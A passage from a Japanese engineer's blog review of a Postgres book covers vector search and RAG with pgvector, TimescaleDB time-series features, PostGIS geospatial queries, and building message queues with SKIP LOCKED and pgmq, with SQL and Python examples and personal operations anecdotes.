\\\\    -d pgvector/pgvector:0.8.0-pg17「Vector Database を導入しましょう」という提案をする前に、「Postgres で試した？」と聞き返せるようになりました。Cosine Distance とベクトル類似検索埋め込みを保存するだけじゃありません。類似検索もできます。SELECT id, name, descriptionFROM omdb.moviesORDER BY movie_embedding <=> omdb.get_embedding(\'May the force be with you\')LIMIT 3;<=> は Cosine Distance を計算する演算子です。pgvector が提供しています。この SQL を実行すると、「May the force be with you」というフレーズに最も関連する映画が返ってきます。当然、Star Wars の映画がトップに来ます。埋め込みモデルが学習した「意味の空間」の中で、近い映画を見つけてくれます。でも、最初は全件スキャンになります。4,000 件程度なら許容できますが、規模が大きくなったら？そこでインデックスが必要になります。IVFFlat と HNSW——2 つのインデックス戦略pgvector は 2 種類のインデックスをサポートしています。IVFFlat: クラスタリングベースの高速化CREATE INDEX movie_embeddings_ivfflat_idxON omdb.moviesUSING ivfflat (movie_embedding vector_cosine_ops)WITH (lists = 5);IVFFlat は埋め込みをクラスタ (リスト) に分割します。k-means でセントロイドを計算し、各埋め込みを最も近いセントロイドのリストに配置します。検索時は、クエリの埋め込みに最も近いセントロイドのリストだけをスキャンします。全件スキャンを避けられます。でも、これは近似検索 (ANN: Approximate Nearest Neighbor) です。真の最近傍が他のリストにいたら、見逃す可能性があります。Recall (再現率) が完璧じゃありません。ivfflat.probes パラメータで、スキャンするリスト数を増やせます。Recall は改善しますが、検索速度は落ちます。BEGIN;SET LOCAL ivfflat.probes = 2;SELECT ...COMMIT;トレードオフです。HNSW: 階層グラフによる高精度検索CREATE INDEX movie_embeddings_hnsw_idxON omdb.moviesUSING hnsw (movie_embedding vector_cosine_ops)WITH (m = 8, ef_construction = 16);HNSW は多層グラフを構築します。上位層は疎で、下位層ほど密になります。検索は最上層から始まり、段階的に下層に降りていきます。高速かつ高精度です。著者の実験では、HNSW は IVFFlat より Recall が良いです。データが追加・更新されても Recall が安定しています。インフラエンジニアとして、この安定性は魅力的です。 データが増えても再インデックスが不要です。IVFFlat はセントロイドが固定されるため、データが大きく変化すると Recall が落ちます。映画カタログは継続的に成長します。HNSW を選ぶ理由があります。（夜中の 2 時に「Recall が落ちてます！」というアラートで起こされるのは、もう懲り懲りです）実際に試してみてわかったのは、ベクトルはランダム生成でも類似検索の動作確認は可能だということ。ジャンルごとにパターンを変えれば、「アクション映画同士が近くなる」という挙動を確認できます。本番データがなくても、仕組みの理解には十分です。RAG の実装——Postgres を中心にこの章の核心は、RAG (Retrieval-Augmented Generation) の実装です。RAG の流れです。ユーザーが質問を入力質問を埋め込みに変換 (mxbai-embed-large)Postgres でベクトル類似検索を実行検索結果をコンテキストとして LLM に渡すLLM がコンテキストを考慮して回答を生成著者は Python の Jupyter Notebook で実装を示しています。LLM には TinyLlama (640 MB、1.1 B パラメータ) を使用しています。def retrieve_context_from_postgres(question):    # 埋め込みモデルに接続    embedding_model = OllamaEmbeddings(model=\\"mxbai-embed-large:335m\\")    # 質問を埋め込みに変換    embedding = embedding_model.embed_query(question)    # Postgres でベクトル類似検索    query = \\"\\"\\"    SELECT name, vote_average, budget, revenue, release_date    FROM omdb.movies    ORDER BY movie_embedding <=> %s::vector LIMIT 3    \\"\\"\\"    cursor.execute(query, (embedding, ))    # コンテキストを構築    context = \\"\\"    for row in cursor.fetchall():        context += f\\"Movie title: {row[0]}, Vote Average: {row[1]}, ...\\"    return contextPostgres から取得した映画情報を LLM に渡します。def answer_question(question, context):    llm = OllamaLLM(model=\\"tinyllama\\", temperature=0.6)    prompt = f\\"\\"\\"    You\'re a movie expert and your task is to answer questions about movies    based on the provided context.    This is the user\'s question: {question}    Consider the following context: {context}    Respond in an engaging style that inspires the user to watch the movies.    \\"\\"\\"    response = llm.invoke(prompt)    return response「海賊映画のおすすめは？」と聞くと、Postgres が Pirates of the Caribbean シリーズを返し、LLM がそれをもとに魅力的な推薦文を生成します。Postgres が RAG のコンテキスト取得レイヤーとして機能しています。LLM は statelessこの章で確認しておきたいのは、「LLM は stateless」という点です。Because LLMs are stateless—meaning they don\'t retain the history of the interaction—if we want the LLM to consider earlier conversation history, we need to store it separately and pass it to the prompt object.LLM は会話履歴を記憶していません。毎回、コンテキストと履歴を渡す必要があります。この設計は、Postgres のステートレス性とも通じます。Postgres はクライアントのセッション状態を保持しません (connection pooling の文脈で)。毎回のクエリは独立しています。だから、会話履歴も Postgres に保存して、RAG のコンテキストとして渡せばいいのです。全てが Postgres で完結します。確認しておきたい拡張pgai という拡張は、この章で初めて目にしました。Explore the pgai extension if you\'d like to implement the RAG workflow purely in SQL and execute it entirely within the database.SQL だけで RAG を実装できます。アプリケーション側に gen AI フレームワークを導入する必要がありません。調べてみたいです。もし実用的なら、Postgres の可能性がさらに広がります。9. Postgres for time seriesTimescaleDB を改めて評価するこの章で取り上げられている TimescaleDB は、名前は知っていましたが、実際に採用を検討したことはありませんでした。時系列データベースと言えば、InfluxDB か Prometheus を中心に検討してきました。「時系列データを扱いたいなら専用のデータベースを追加しましょう」という提案をしてきたこともあります。でも、この章を読んで気づきました。Postgres の拡張機能で時系列データベースができます。「Just use Postgres」の考え方が、ここでも貫かれています。新しいデータベースを追加する前に、まず Postgres で解決できるか確認します。TimescaleDB はその選択肢の 1 つです。運用エンジニアとしては、これは大きいです。新しいデータベースを追加するたびに、バックアップ戦略、モニタリング、アラートルール、障害対応手順が増えます。チームのメンバーも新しい技術を学ばなければいけません。もし Postgres の拡張機能で解決できるなら、運用負荷は格段に減ります。この章を読み終えて、「次に時系列データの相談が来たら、TimescaleDB を試してみよう」と思いました。Postgres のパーティショニングと Hypertable9.1 節では、Postgres のテーブルパーティショニングが紹介されています。CREATE TABLE heart_rate_measurements (  watch_id INT NOT NULL,  recorded_at TIMESTAMPTZ NOT NULL,  heart_rate INT NOT NULL,  activity TEXT NOT NULL CHECK (      activity IN (\'walking\', \'sleeping\', \'resting\', \'workout\'))) PARTITION BY RANGE (recorded_at);PARTITION BY RANGE (recorded_at) で、recorded_at カラムの値に基づいてテーブルを範囲でパーティション分割する。その後、各パーティションを手動で作成する必要がある。CREATE TABLE measurements_jan2025    PARTITION OF heart_rate_measurements    FOR VALUES FROM (\'2025-01-01\') TO (\'2025-02-01\');CREATE TABLE measurements_feb2025    PARTITION OF heart_rate_measurements    FOR VALUES FROM (\'2025-02-01\') TO (\'2025-03-01\');このパーティショニング自体は Postgres の標準機能です。時系列データの場合、直近のデータだけが頻繁にアクセスされて、古いデータは圧縮したり削除したりします。パーティショニングを使えば、それが簡単にできます。でも、パーティションの作成と管理は手動でやる必要があります。著者も書いていますが、pg_partman と pg_cron という拡張機能を使えば自動化できます。そして、9.2 節で登場するのが TimescaleDB です。SELECT create_hypertable(  relation => \'watch.heart_rate_measurements\',  dimension => by_range(\'recorded_at\', interval \'1 month\'),  create_default_indexes => false);この一文で、テーブルが Hypertable に変換されます。Hypertable は Postgres の通常のテーブルですが、TimescaleDB が自動的にパーティション（chunk と呼ばれる）を作成・管理してくれます。新しいデータが挿入されると、TimescaleDB が自動的に新しい chunk を作ります。INSERT INTO watch.heart_rate_measurements VALUES(1,\'2025-12-08 00:25:00\',57,\'sleeping\');この INSERT だけで、_timescaledb_internal._hyper_1_13_chunk という新しいパーティションが自動生成されます。手動でパーティションを作る必要がありません。これは大きいです。timescaledb_information.chunks でチャンクのメタデータを確認できます。実際に確認してみると、日付ごとにチャンクが自動生成されていることがわかります。_hyper_1_1_chunk | 2025-01-01 - 2025-01-02_hyper_1_2_chunk | 2025-01-02 - 2025-01-03_hyper_1_3_chunk | 2025-01-03 - 2025-01-04この透過性が TimescaleDB の魅力です。過去のプロジェクトで、パーティショニングを手動で管理していたことがあります。月次バッチで次月のパーティションを作成するスクリプトを cron で回していました。でも、そのスクリプトが失敗したことに気づかず、翌月の INSERT が全部エラーになりました。月初の朝、Slack が火を噴きました。「データが入らない！」というメッセージが次々と流れてくる。あの日の朝のコーヒーは、確実に苦かったです。TimescaleDB を使っていれば、そんなことは起きませんでした。というか、あの朝のコーヒーはもっと美味しかったはずです。データ保持ポリシーの自動化9.4 節では、データ保持ポリシー（retention policy）の話が出てきます。SELECT add_retention_policy(  \'watch.heart_rate_measurements\', INTERVAL \'30 days\');これだけで、30 日以上古いデータを自動的に削除するジョブが設定されます。運用の観点から、これは非常にありがたいです。時系列データは増え続けます。ディスク容量は有限です。古いデータを定期的に削除する必要があります。過去のプロジェクトでは、手動で SQL を書いて、古いパーティションを DROP していました。でも、これも失敗することがあります。削除スクリプトのバグで、間違ったパーティションを削除してしまったこともありました。具体的に言うと、measurements_jan2025 を消すはずが measurements_jan2024 を消しました。そう、1 年分のデータが吹っ飛びました。バックアップから復旧しましたが、あの日の胃痛は今でも忘れられません。エンジニアのキャリアにおいて、誰もが一度は通る「DELETE/DROP の洗礼」というやつです。TimescaleDB の retention policy を使えば、そのリスクが減ります。胃痛も減ります。ただし、著者も警告していますが、このコマンドは慎重に使う必要があります。間違った設定をすると、重要なデータを失う可能性があります。time_bucket 関数の威力9.5 節では、TimescaleDB の time_bucket 関数が紹介されています。SELECT  time_bucket(\'10 minutes\', recorded_at) AS period, activity,  AVG(heart_rate)::int AS avg_rate, MAX (heart_rate)::int AS max_rateFROM watch.heart_rate_measurementsWHERE watch_id = 1 AND activity = \'workout\'  AND recorded_at >= \'2025-04-23\' AND recorded_at < \'2025-04-24\'GROUP BY period, activity ORDER BY period;これで、10 分ごとのバケットに心拍数を集約できます。普通の SQL でやろうとすると、DATE_TRUNC や複雑な計算が必要になります。でも、time_bucket を使えば、読みやすいクエリで簡単に集約できます。さらに、time_bucket はタイムゾーンの指定もできます。SELECT time_bucket(\'1 week\', recorded_at, \'Asia/Tokyo\',  \'2025-04-01\'::timestamptz) AS period, activity,  AVG(heart_rate)::int AS avg_rate,  MAX (heart_rate)::int AS max_rate, MIN (heart_rate)::int AS min_rateFROM watch.heart_rate_measurementsWHERE watch_id = 2 AND recorded_at >= \'2025-04-01\'AND  recorded_at < \'2025-04-15\'GROUP BY period, activity ORDER BY period, activity;ユーザーごとに異なるタイムゾーンでデータを集約できます。これはグローバルなサービスでは必須の機能です。そして、time_bucket_gapfill 関数です。SELECT watch_id, time_bucket_gapfill(\'1 minute\', recorded_at) AS minute,  LOCF(AVG(heart_rate)::int) AS avg_rateFROM watch.heart_rate_measurementsWHERE watch_id=1 AND recorded_at BETWEEN \'2025-03-02 07:25\'  AND \'2025-03-02 07:36\'GROUP BY watch_id, minute ORDER BY minute;データが欠けている時間帯も含めて、連続した時間バケットを作成してくれます。さらに、LOCF（Last Observation Carried Forward）関数を使えば、欠損値を最後の値で埋めることができます。過去に、時系列データのグラフを作ったことがあります。データに欠損があると、グラフが途切れてしまいます。アプリ側で欠損値を補間する処理を書きましたが、複雑でした。time_bucket_gapfill と LOCF を使えば、データベース側で簡単に処理できます。Continuous Aggregates という機能9.6 節では、Continuous Aggregates（継続的集約）が紹介されています。CREATE MATERIALIZED VIEW watch.low_heart_rate_count_per_5minWITH (timescaledb.continuous) ASSELECT  watch_id,  time_bucket(\'5 minutes\', recorded_at) AS bucket,  MIN(heart_rate) as min_rate,  COUNT(*) FILTER (WHERE heart_rate < 50) AS low_rate_count,  COUNT(*) AS total_measurementsFROM watch.heart_rate_measurementsGROUP BY watch_id, bucket;これは Postgres の Materialized View（マテリアライズドビュー）ですが、TimescaleDB が自動的にリフレッシュしてくれます。リフレッシュポリシーも設定できます。SELECT add_continuous_aggregate_policy  (\'watch.low_heart_rate_count_per_5min\',  start_offset => INTERVAL \'15 minutes\',  end_offset => INTERVAL \'1 minute\',  schedule_interval => INTERVAL \'1 minute\');これで、1 分ごとに集約結果が更新されます。普通の Materialized View は、手動で REFRESH MATERIALIZED VIEW を実行しないと更新されません。でも、TimescaleDB の Continuous Aggregates は自動的に更新されます。しかも、Hypertable に保存されるので、パーティショニングの恩恵も受けられます。この章の例では、心拍数が 50 BPM 以下の回数をカウントして、徐脈（bradycardia）の兆候を検出しています。リアルタイムで集約結果を更新して、ユーザーにアラートを送ります。これ、単なるデモではありません。実用的です。過去に、IoT デバイスからのデータを集約して、異常を検知するシステムを運用したことがあります。集約処理は別のバッチジョブで定期的に実行していました。でも、リアルタイム性が求められると、バッチでは間に合いません。TimescaleDB の Continuous Aggregates を使えば、リアルタイムに近い形で集約結果を更新できます。B-tree インデックスと BRIN インデックス9.7 節では、時系列データのインデックス戦略が紹介されています。まず、B-tree インデックスです。CREATE INDEX heart_rate_btree_idxON watch.heart_rate_measurements (recorded_at, watch_id);複合インデックスで、recorded_at と watch_id の両方を含めます。これで、時間範囲とデバイス ID の両方で絞り込むクエリが高速化されます。著者の説明によれば、B-tree インデックスは実際のカラム値とテーブル行へのポインタを保存します。だから、特定の行に直接アクセスできます。でも、B-tree インデックスはサイズが大きいです。この章の例では、パーティションごとに数 MB のサイズになっています。そこで登場するのが BRIN（Block Range Index）です。CREATE INDEX heart_rate_brin_idxON watch.heart_rate_measurementsUSING brin (recorded_at);BRIN インデックスは、ページ範囲ごとの最小値と最大値だけを保存します。だから、サイズが非常に小さいです。この章の例では、24 KB しかありません。B-tree の 100 分の 1 です。でも、BRIN はページ全体をスキャンする必要がある場合があります。だから、少量のデータを取得するクエリでは B-tree の方が速いです。著者の説明を読んで、BRIN の仕組みがよくわかりました。時系列データのように、カラム値が物理的な配置と強く相関している場合に BRIN は有効です。心拍数測定データは常に追記されます。新しい測定は常に大きな recorded_at 値を持ちます。だから、ページ内のデータは時系列順に並びます。BRIN はこの特性を活かします。過去に、ログテーブルにインデックスを作ったことがあります。そのテーブルは append-only で、タイムスタンプカラムがありました。B-tree インデックスを作りましたが、サイズが大きくなって困りました。「なんでインデックスがテーブルより大きいんだ？」と首を傾げながら、ディスク容量を確保するために古いインデックスを削除する日々でした。当時は BRIN を検討していませんでした。Postgres のドキュメントで存在は知っていたはずですが、実際に使う場面を意識していませんでした。必要に迫られないと、知識は実践に結びつかないものです。10. Postgres for geospatial data「地理空間データ」の意外な身近さこの章を読んで認識したのは、地理空間データベースの機能が、自分の仕事に意外と近いということです。PostGIS の名前は知っていました。でも、「地理空間データベース」という言葉から受ける印象は、「GIS 専門家のための特殊な技術」でした。Google Maps みたいなサービスを作る時に使うやつ、くらいの認識。要するに、「自分には関係ない」と決めつけていたわけです。実際には、もっと身近なユースケースがあります。著者が冒頭で説明する Geofabrik（OpenStreetMap のデータ抽出サービス）、osm2pgsql（OSM データのインポートツール）、QGIS（データ可視化ツール）。これらのツールと PostGIS の組み合わせで、10 分以内にフロリダ州全体の地理データをローカル環境で扱える状態にできます。この手軽さが、「Just use Postgres」の真髄だと感じました。geometry と geography — 2つのデータ型の意味10.1.2 節で説明される geometry と geography の違いに、初めて向き合いました。geometry 型（Web Mercator projection、SRID 3857）。- 平面（Euclidean plane）として計算- 単位はメートル- 計算が速い- 距離が長いと精度が落ちるgeography 型（WGS 84、SRID 4326）。- 球面（spherical model）として計算- 単位は度（longitude/latitude）だが、計算結果はメートル- 計算が遅い- 地球の曲率を考慮するため正確「なるほど、速度と精度のトレードオフか」と思いました。でも、本当に理解したのは、用途によって使い分ける必要があるということでした。ローカルな範囲（例：Tampa 市内のレストラン検索）なら geometry で十分です。でも、大陸をまたぐような距離の計算なら geography が必要になります。注意点として、ST_Distance に geometry 型を渡すと単位は「度」になります。geography 型を渡すと「メートル」です。最初、この違いを知らずに「距離が 0.003 って何？」と混乱しました。それ、度でした。著者は本章で主に geometry を使っています。理由は明示されていませんが、フロリダ州内のデータを扱っているからでしょう。ST_DWithin と ST_Distance — index の有無で 500 倍の差10.6.2 節の実行計画の比較に目を奪われました。ST_DWithin を使った場合（Listing 10.26）:- 実行時間: 1.125 ms- GiST index を使用（Bitmap Index Scan）- 1,205 件を候補として抽出し、36 件にフィルタリングST_Distance を使った場合（Listing 10.27）:- 実行時間: 488.119 ms- GiST index を使用せず、フルテーブルスキャン（Parallel Seq Scan）- 18,676 件を候補として抽出し、36 件にフィルタリング同じ結果（36 件のレストラン）を得るのに、434 倍の時間がかかっています。なぜこんなに違うのでしょうか。片や 1 ミリ秒でサクッと答え、片や半秒近く考え込んでいます。まるで、道を聞かれて地図アプリを開く人と、記憶を辿って一生懸命思い出そうとする人くらい違います。ST_DWithin is one of the index-aware functions that can use the GiST index by performing an initial fast filtering of the data using the combination of the bounding box operator && and the ST_Expand function.著者の説明によると、ST_DWithin は内部で bounding box（境界ボックス）を使った高速フィルタリングをします。GiST index がこの bounding box 検索に対応しています。一方、ST_Distance は常に正確な距離を計算します。bounding box を使わないから、index を利用できません。この違いを知らなかったら、「ST_Distance(point1, point2) <= 500 で 500m 以内を検索」と書いてしまっていたでしょう。数百万件のデータに対してフルスキャンが走ります。「index-aware functions」という概念を、初めて意識しました。GiST の構造 — R-tree で理解できた10.6.1 節の GiST index の説明は、初めて「わかった」感覚がありました。以前、B-tree index については理解していました。でも、GiST（Generalized Search Tree）は「汎用的な index」という説明しか見たことがなく、具体的なイメージが湧きませんでした。著者の図解（Figure 10.6, 10.7, 10.8）がわかりやすかったです。フロリダ州全体を 5 つの大きな矩形（R1〜R5）に分割それぞれの矩形をさらに小さな矩形に分割（R6〜R25）最小の矩形が、実際のテーブル行（points）を指す検索の流れ。1. Downtown Miami の座標が、どの大きな矩形に含まれるかをチェック → R52. R5 の中で、どの小さな矩形に含まれるかをチェック → R243. R24 の中の全 points をスキャン → 該当するものだけ返すR-tree（Rectangular tree）という名前の由来も理解できました。矩形（Rectangle）で空間を階層的に分割していく木構造です。実際に座標変換も試してみました。Walt Disney World の座標を WGS 84 から Web Mercator へ変換すると、経度 -81.5639 が X -9079651.82 に変わります。緯度 28.3852 は Y 3297626.07 になります。単位がメートルに変わるのがわかります。この構造、実は Chapter 6 の全文検索で出てきた GiST index と同じ基盤です。あの時は tsvector 型の lexemes を indexing していました。今回は geometry 型の bounding boxes を indexing しています。GiST は、データ型ごとに異なる index 構造を実装できる汎用フレームワークなんだと、やっと腹落ちしました。QGIS で可視化 — 「見える」ことの重要性10.4 節の QGIS による可視化は、実際に手を動かしました。SELECT name, ST_AsText(way) AS coordinatesFROM florida.planet_osm_pointWHERE name = \'Tampa\' and place = \'city\';このクエリで得た Tampa の座標を、QGIS で表示した時、「あ、本当に Tampa の中心だ」と思いました。データベースに入っている座標が、実際の地図上の位置と一致します。当たり前のことですが、自分の目で確認するまで信じられませんでした。planet_osm_polygon テーブルの 6.8 100 万の polygons を QGIS で読み込むと、フロリダ州の地図が少しずつレンダリングされていきます。湖、道路、建物、公園。すべてが Postgres のテーブルに格納されています。「データが見える」ことの重要性を、改めて実感しました。osm2pgsql — データインポートの簡単さ10.3 節で紹介されている osm2pgsql ツールは実用的です。docker run --name osm2pgsql --network=\\"host\\" \\\\  -e PGPASSWORD=password \\\\  -v osm2pgsql-volume:/data \\\\  iboates/osm2pgsql:2.1.1 \\\\  -H 127.0.0.1 -P 5432 -d postgres -U postgres --schema florida \\\\  http://d3e4uq6jj8ld3m.cloudfront.net/florida-250501.osm.pbfこのコマンド 1 つで、フロリダ州全体の OSM データ（2025 年 5 月 1 日時点）を Postgres にインポートできます。所要時間は約 10 分。自分の環境（M1 Mac）では 7 分ほどでした。インポート後、以下のテーブルが自動生成されます。planet_osm_point — 単一座標で表現できるもの（レストラン、ホテルなど）planet_osm_line — 線分（道路、川など）planet_osm_polygon — 閉じた領域（建物、公園、湖など）planet_osm_roads — planet_osm_line のサブセット（ズームレベルが低い時のレンダリング用）それぞれのテーブルに、既に GiST index が作成されています（planet_osm_point_way_idx など）。この「すぐに使える」感覚が、PostGIS の魅力だと感じました。ST_Within と ST_Intersects — 空間関係の判定10.5.2 節と 10.5.3 節で紹介される ST_Within と ST_Intersects の違いが、最初は曖昧でした。ST_Within(A, B)。- A が B の中で完全に含まれている場合は true- A の全ての点が、B の内部にある- 例：あるアトラクションが、Disney\'s Hollywood Studios の中にあるかST_Intersects(A, B)。- A と B が少なくとも 1 点を共有する場合は true- 完全に含まれていなくてもいい、交差していれば OK- 例：ある道路が、Miami の境界を横切っているかListing 10.22 のクエリで理解できました。SELECT l.name, l.highway, ST_Length(l.way) AS len_metersFROM florida.planet_osm_line lJOIN miami m ON ST_Intersects(l.way, m.boundaries)WHERE l.highway IN (\'primary\', \'secondary\')このクエリは、Miami の境界内にある道路だけでなく、境界を横切る道路も取得します。ST_Within を使っていたら、境界を横切る道路は取得できません。この違いを知らないと、「なぜこの道路が結果に含まれるのか」と混乱したでしょう。「Just use Postgres」の再確認この章を読んで、改めて「Just use Postgres」の意味を理解しました。次に「位置情報を扱うから、MongoDB（GeoJSON 対応）を追加しよう」と言われた時、私は聞き返せます。「Postgres で試した？PostGIS なら、既存のインフラでできるかもしれない」新しいデータベースを追加する前に、まず既存の Postgres で何ができるかを確認します。これがこの本の一貫したメッセージです。そして、大抵の場合、Postgres でできてしまいます。追加のインフラを管理する手間（と、深夜の障害対応）が減るのは、エンジニアとしても組織やチームとしてもありがたいです。地理データだって、Postgres でできます。それも、思ったより簡単に。11. Postgres as a message queueメッセージキューとして Postgres を使う、という選択この章で参考になったのは、「Postgres をメッセージキューとして使う判断基準」が明確に示されていた点です。正直に言うと、読む前は「Postgres でメッセージキュー？　無理がある」と思っていました。10 年近くソフトウェアエンジニアをやっている中で、メッセージキューといえば RabbitMQ、Kafka、AWS SQS が標準でした。Postgres はあくまでリレーショナルデータベース。「餅は餅屋」という言葉が頭に浮かびました。というか、新しいツールを導入する言い訳が欲しかっただけかもしれません（インフラエンジニアの悪い癖です）。でも、この章を読み終えて気づきました。「Just use Postgres」の本質は、万能性じゃなくて、既存資産の最大活用でした。Postgres をメッセージキューとして使う 3 つの基準11.1 節で、著者は 3 つの基準を挙げています。1. トランザクショナルな一貫性が必要な場合DMV（運転免許センター）の例が分かりやすかったです。来訪者がチェックインする（ビジネスロジック）と同時に、待機キューにメッセージを追加する（イベント記録）。この 2 つの操作がアトミックに実行される必要があります。もし別々のシステム（Postgres + 専用メッセージキュー）だったら、チェックインは成功したのにメッセージ送信が失敗する可能性があります。その時、アプリケーション側で整合性を保証しなければなりません。If you want the check-in operation and the message added to the visitors queue to be executed atomically (as a single transaction), then use Postgres.この一文は重いです。私が関わったプロジェクトで、「決済処理」と「メール送信キュー」が別々のシステムだったせいで、決済完了したのに確認メールが届かないトラブルがありました。結局、リトライ機構を複雑に実装して解決しましたが、あれは Postgres で統一できていれば避けられたかもしれません。深夜 3 時に「メールキューが詰まった」アラートで起こされることもなかったでしょう（遠い目）。2. メッセージ量が Postgres で処理可能な場合著者は正直です。If the effort is too high or the configuration becomes overly complex, consider using a specialized message queue instead.Postgres の書き込みスケールには限界があります。シングルプライマリインスタンスだから、書き込み負荷が高すぎる場合はシャーディングや分散 Postgres（CitusData、YugabyteDB）が必要になります。でも、DMV の例では「メッセージ量は比較的低い」と明言しています。この「正直さ」がいいです。Postgres は万能じゃない、でも適切なユースケースならシンプルで強力です。3. 既に Postgres を使っている場合If your application already uses Postgres and now needs to support a message queue use case, consider using Postgres first before bringing in a specialized solution.これが「Just use Postgres」の核心です。新しいシステムを追加するコストは、技術的負債だけじゃありません。学習コスト、運用コスト、監視・バックアップ・障害対応の複雑化。全てがチームの負担になります。既に Postgres を運用しているなら、まず Postgres で試してみる。それで十分なら、アーキテクチャはシンプルなままです。カスタムメッセージキューの実装11.2 節と 11.3 節では、カスタムメッセージキューを実装しています。シンプルな設計CREATE TABLE mq.queue (    id BIGSERIAL PRIMARY KEY,    message JSON NOT NULL,    created_at TIMESTAMPTZ DEFAULT NOW(),    status mq.status NOT NULL DEFAULT \'new\');この設計、シンプルだけど実用的です。id: 自動採番（BIGSERIAL）で一意性を保証message: JSON 型でペイロードを格納（柔軟性重視）created_at: FIFO 順序の保証status: メッセージのライフサイクル管理（new → processing → completed）著者が JSON 型を選んだ理由が面白いです。The JSONB type would preprocess messages before storing them, which might slow down ingestion and alter the original structure—for example, by reordering object keys.JSONB はクエリ効率のために前処理を行いますが、メッセージキューでは「プロデューサーからコンシューマーへそのまま渡す」だけだから、JSON 型で十分です。この「ユースケースに応じた選択」が、エンジニアリングの本質だと感じました。FOR UPDATE SKIP LOCKED の威力mq.dequeue 関数の実装で、FOR UPDATE SKIP LOCKED が使われています。SELECT id FROM mq.queueWHERE status = \'new\' ORDER BY created_atFOR UPDATE SKIP LOCKEDLIMIT messages_cntこの構文は、改めて確認すると有用です。FOR UPDATE は行レベルロックをかけます。通常なら、他のトランザクションがロックされた行にアクセスしようとするとブロックされて待機します。でも SKIP LOCKED を加えると、ロックされている行をスキップして、次の利用可能な行を取得します。複数のコンシューマーが並行してメッセージを取得しても、お互いをブロックせずに並列処理できます。This allows consumers to process new messages in parallel without blocking each other, improving overall throughput.これは Postgres のメッセージキュー実装におけるキラー機能です。実際に 2 つのワーカーを同時に動かして確認しました。Worker 1 がメッセージ 1, 2 を取得している間、Worker 2 はブロックされずにメッセージ 3, 4 を取得できます。お互いが異なるメッセージを処理する。これが SKIP LOCKED の威力です。以前、複数ワーカーでジョブキューを処理する実装を Rust で書いた時、排他制御で悩んだことがあります。あの時、FOR UPDATE SKIP LOCKED を知っていれば、もっとシンプルに実装できたかもしれません。LISTEN と NOTIFY11.4 節の LISTEN / NOTIFY は、Postgres の隠れた名機能だと感じました。DMV のシナリオでは、来訪者がチェックインすると、待機中の職員にリアルタイムで通知が届きます。-- 職員側（リスナー）LISTEN queue_new_message;-- ターミナル側（ノティファイア）SELECT mq.enqueue(\'{\\"service\\": \\"car_registration\\", \\"visitor\\": \\"Marta Jones\\"}\');-- → pg_notify(\'queue_new_message\', \'new_message\')これで、ポーリング不要の非同期通知が実現できます。ただし、2 つの制限があります。過去の通知は受け取れない: 接続後に発行された通知のみ受信可能レプリカでは使えない: プライマリノードへの接続が必要特に 2 つ目は運用上重要です。読み取り負荷をレプリカに逃がしている構成でも、LISTEN/NOTIFY 専用にプライマリへの接続を維持する必要があります。でも、この制限を理解した上で使えば、非常に強力な機能です。あと、pg_notify はトランザクション終了時に送信されます。途中でロールバックすると通知も送られません。これは整合性の観点から正しい動作ですが、最初は「なぜ通知が来ない？」と悩みました。実装上の考慮事項11.5 節では、いくつかの重要な考慮事項が述べられています。インデックス戦略mq.dequeue 関数は、デフォルトではフルテーブルスキャンを行います。created_at と status にインデックスがないからです。著者は 2 つのオプションを提示しています。オプション 1: created_at のみのインデックス。CREATE INDEX mq_created_at_index_btree ON mq.queue (created_at);オプション 2: パーシャルインデックス（推奨）CREATE INDEX mq_partial_index_btreeON mq.queue (created_at, status)WHERE status = \'new\';パーシャルインデックスは、status = \'new\' の行だけをインデックスに含めます。これで、インデックスサイズが小さくなり、new メッセージへのアクセスがさらに高速化されます。この「状況に応じた最適化」の姿勢が参考になります。DMV のユースケースでは不要かもしれませんが、高頻度メッセージングなら必須です。パーティショニング11.5.3 節のパーティショニングの話は、時系列データの章（第 9 章）とつながりました。メッセージキューも時系列データの一種です。created_at でレンジパーティショニングすれば、古いメッセージを効率的にアーカイブ・削除できます。CREATE TABLE mq.queue (    id BIGSERIAL,    message JSON NOT NULL,    created_at TIMESTAMPTZ DEFAULT NOW(),    status mq.status NOT NULL DEFAULT \'new\',    PRIMARY KEY (id, created_at)) PARTITION BY RANGE (created_at);パーティションごとにメッセージを管理できるから、古いパーティションを削除（DROP TABLE）するだけで大量の古いメッセージを一瞬で消せます。VACUUM の負荷も軽減されます。なぜなら、新しいパーティションだけが頻繁に更新されるからです。この設計パターンは、ログ管理やイベントストアにも応用できそうです。フェイルオーバー機構11.5.4 節で、メッセージ処理の失敗対策が述べられています。コンシューマーがメッセージを取得（status = \'processing\'）した後にクラッシュすると、そのメッセージは processing 状態のまま放置されます。著者の提案は、pg_cron を使った定期的なリセットです。a periodic job in the database to check for messages stuck in the processing state and reset their status to new.これは実用的です。ただし、同じメッセージが複数回処理される可能性があるから、コンシューマー側で冪等性を保証する必要があります。pgmq 拡張11.6 節と 11.7 節では、pgmq 拡張が紹介されています。pgmq は「Postgres Message Queue」の略で、AWS SQS 互換の API を提供します。カスタム実装で学んだ原理を、pgmq が抽象化してくれます。可視性タイムアウトpgmq.read 関数の vt（visibility timeout）が面白いです。SELECT msg_id, message, enqueued_atFROM pgmq.read(  queue_name => \'visitors_queue\',  vt         => 120,  -- 2分間の可視性タイムアウト  qty        => 1);メッセージを取得してから 120 秒間、そのメッセージは他のコンシューマーから見えなくなります。でも、120 秒以内に pgmq.archive を呼ばないと、メッセージは再びキューに戻ります。これで、コンシューマー失敗時の自動リトライが実現できます。DMV の例では、職員が来訪者を呼び出してから 2 分以内に現れなければ、別の来訪者を呼び出せる仕組みに使われています。この「タイムアウトベースのフェイルオーバー」は、AWS SQS と同じ設計パターンです。アーカイブテーブルpgmq.archive 関数は、メッセージを pgmq.q_visitors_queue から pgmq.a_visitors_queue に移動します。削除（DELETE）ではなくアーカイブ（移動）だから、処理済みメッセージの監査ログを保持できます。これは本番運用で重要です。「このメッセージ、本当に処理されたのか？」を後から確認できます。本全体を読み終えて第 11 章は、この本の最終章です。第 1 章「Meeting Postgres」から始まり、JSON、地理空間、全文検索、時系列、ベクトル検索、グラフ、そしてメッセージキュー。「Just use Postgres」の本質は、Postgres の万能性を主張することじゃありませんでした。既に Postgres を使っているチームが、新しいユースケースに直面した時、別のデータベースを追加する前に、まず Postgres で解決できるか試してみよう、というメッセージです。それは、アーキテクチャをシンプルに保つための選択であり、運用コストを抑えるための選択であり、チームの認知負荷を減らすための選択です。10 年近くソフトウェアエンジニアをやってきて、システムが複雑化する様子を何度も見てきました。「全文検索だから Elasticsearch」「時系列データだから InfluxDB」「メッセージキューだから 